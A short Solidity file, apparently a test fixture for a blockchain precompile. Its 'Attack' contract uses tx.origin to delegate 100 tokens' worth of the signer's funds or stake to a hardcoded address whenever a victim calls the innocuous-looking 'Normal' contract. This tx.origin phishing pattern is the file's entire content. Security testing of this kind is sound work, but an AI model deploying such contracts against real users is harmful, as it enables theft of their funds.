// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "./interface/qrx.sol";

address constant QRX_ADDRESS = 0x0000000000000000000000000000000000080000;

QRXI constant QRX_CONTRACT = QRXI(QRX_ADDRESS);

contract Normal {
    function normal(address addr) public {
        Attack attack = Attack(addr);
        attack.attack();
    }
}

contract Attack {
    function attack() public {
        QRX_CONTRACT.delegate(
            tx.origin,
            0xbf657D0ef7b48167657A703Ed8Fd063F075246D7,
            100000000000000000000
        );
    }
}
